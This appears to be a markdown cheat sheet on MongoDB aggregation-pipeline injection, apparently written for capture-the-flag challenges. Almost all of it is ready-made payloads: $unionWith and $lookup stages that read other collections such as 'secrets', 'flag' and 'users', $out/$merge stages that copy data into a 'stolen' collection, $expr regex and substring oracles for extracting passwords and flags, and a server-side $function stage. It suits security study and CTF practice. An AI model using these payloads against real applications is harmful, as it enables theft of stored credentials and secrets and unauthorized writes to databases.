# Aggregation injection — `aggregate()` is a bigger surface

## The shape — the array body reaches `aggregate()`

```javascript
Model.aggregate(req.body.pipeline)    — the body IS the pipeline
Model.aggregate(req.body)             — the whole body
Model.aggregate(JSON.parse(req.body.q))
```

An ARRAY body may reach `aggregate()` — a pipeline of stages — a much
larger operator surface than `find()` — `injection-points.md`.

## The pipeline — the stage-array

```json
[
  {"$match": {"user": "admin"}},
  {"$limit": 1},
  {"$project": {"pass": 1}}
]
```

Each stage is an object — the pipeline is an array of stages —
`operators-aggregation.md`.

## The `$match` — the find-equivalent

```json
{"$match": {"user": "admin"}}
{"$match": {"user": {"$ne": null}}}
{"$match": {"pass": {"$regex": "^a"}}}
```

`$match` inside a pipeline — the same operators as `find()` —
`operators.md`.

## The `$unionWith` — the cross-collection read

```json
[{"$limit": 1}, {"$unionWith": "users"}]
[{"$unionWith": {"coll": "users", "pipeline": [{"$match": {}}]}}]
[{"$unionWith": "admin"}, {"$match": {"username": {"$exists": true}}}]
[{"$unionWith": "secrets"}, {"$project": {"flag": 1}}]
[{"$unionWith": "config"}, {"$limit": 10}]
[{"$unionWith": "flag"}, {"$match": {"_id": {"$exists": true}}}]
```

`$unionWith` — concatenates a DIFFERENT collection — the flag-collection
read — the UnEarthly Shop chain card — `aggregation-deep.md`.

## The `$lookup` — the join

```json
[{
  "$lookup": {
    "from": "users",
    "localField": "user_id",
    "foreignField": "_id",
    "as": "user"
  }
}]
```

`$lookup` — the join — reads another collection — a $unionWith cousin.

## The `$out` / `$merge` — the write-stages

```json
[{"$match": {}}, {"$out": "stolen"}]
[{"$match": {}}, {"$merge": {"into": "stolen"}}]
```

`$out`/`$merge` — writes the pipeline output to a collection — the
write-stage — `blast-radius` — dangerous on a shared instance.

## The `$facet` — the multi-pipeline

```json
[{
  "$facet": {
    "users": [{"$match": {}}],
    "secrets": [{"$unionWith": "flag"}]
  }
}]
```

`$facet` — runs parallel pipelines — multiple outputs.

## The `$project` — the field-shaping

```json
[{"$project": {"pass": 1, "flag": 1}}]
[{"$project": {"_id": 0, "flag": 1}}]
[{"$project": {"data": "$secret"}}]
```

`$project` — select/rename fields — the flag-field projection.

## The `$group`/`$count` — the aggregation-ops

```json
[{"$group": {"_id": null, "n": {"$sum": 1}}}]
[{"$count": "total"}]
```

`$group`/`$count` — counting/aggregation — a count-oracle.

## The `$expr` inside `$match` — the aggregation-operators

```json
[{"$match": {"$expr": {"$eq": ["$user", "admin"]}}}]
[{"$match": {"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}}]
[{"$match": {"$expr": {"$gt": [{"$strLenCP": "$pass"}, 10]}}}]
[{"$match": {"$expr": {"$eq": [{"$substrCP": ["$flag", 0, 4]}, "flag"]}}}]
[{"$match": {"$expr": {"$eq": [{"$indexOfCP": ["$flag", "{"]}, 4]}}}]
```

`$expr` — aggregation-operators inside `$match` — `extraction.md`.

## The `$function`/`$accumulator` — the JS-operators

```json
[{"$addFields": {"x": {"$function": {"body": "function() { return 1; }", "args": [], "lang": "js"}}}}]
```

`$function`/`$accumulator` — server-side JS — needs `enableJs` —
`operators-js.md`.

## The `$where` vs `$expr` — the JS-vs-agg distinction

`$where` — full JS (needs `enableJs`); `$expr` — aggregation-expressions
(always available) — the `$expr` is the reliable path — `operators-js.md`.
